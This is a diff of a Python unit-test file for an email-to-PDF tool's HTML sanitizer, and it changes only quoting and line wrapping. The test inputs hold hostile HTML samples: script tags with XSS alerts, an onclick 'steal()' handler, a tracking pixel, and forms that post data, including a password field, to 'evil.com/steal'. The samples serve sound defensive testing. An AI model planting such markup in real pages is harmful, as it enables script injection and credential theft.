@@ -1,4 +1,5 @@
 """Unit tests for HTML sanitization security functions."""
+
 import unittest
 from eml2pdf.security import sanitize_html
 
@@ -8,7 +9,9 @@ class TestSanitizeHtml(unittest.TestCase):
 
     def test_removes_script_tags(self):
         """Script tags should be completely removed."""
-        html = '<p>Safe content</p><script>alert("XSS")</script><p>More safe</p>'
+        html = (
+            '<p>Safe content</p><script>alert("XSS")</script><p>More safe</p>'
+        )
         result = sanitize_html(html)
         self.assertNotIn('<script>', result)
         self.assertNotIn('alert', result)
@@ -49,7 +52,9 @@ class TestSanitizeHtml(unittest.TestCase):
 
     def test_removes_form_tags(self):
         """Form tags should be completely removed."""
-        html = '<form action="http://evil.com/steal"><input name="data"></form>'
+        html = (
+            '<form action="http://evil.com/steal"><input name="data"></form>'
+        )
         result = sanitize_html(html)
         self.assertNotIn('<form', result)
         self.assertNotIn('evil.com', result)
@@ -162,7 +167,7 @@ class TestSanitizeHtml(unittest.TestCase):
 
     def test_complex_attack_scenario(self):
         """Test a complex multi-vector attack is fully sanitized."""
-        html = '''
+        html = """
         <div onclick="steal()" data-evil="payload">
             <script>alert('XSS')</script>
             <img src="http://tracker.com/pixel.gif">
@@ -172,7 +177,7 @@ class TestSanitizeHtml(unittest.TestCase):
                 <input name="password">
             </form>
         </div>
-        '''
+        """
         result = sanitize_html(html)
 
         # Verify all dangerous elements are removed or neutralized
@@ -202,7 +207,7 @@ class TestSanitizeHtml(unittest.TestCase):
 
     def test_safe_html_preserved(self):
         """Safe, common HTML elements should be preserved."""
-        html = '''
+        html = """
         <html>
             <body>
                 <h1>Title</h1>
@@ -213,7 +218,7 @@ class TestSanitizeHtml(unittest.TestCase):
                 </ul>
             </body>
         </html>
-        '''
+        """
         result = sanitize_html(html)
         self.assertIn('<h1>Title</h1>', result)
         self.assertIn('<strong>bold</strong>', result)
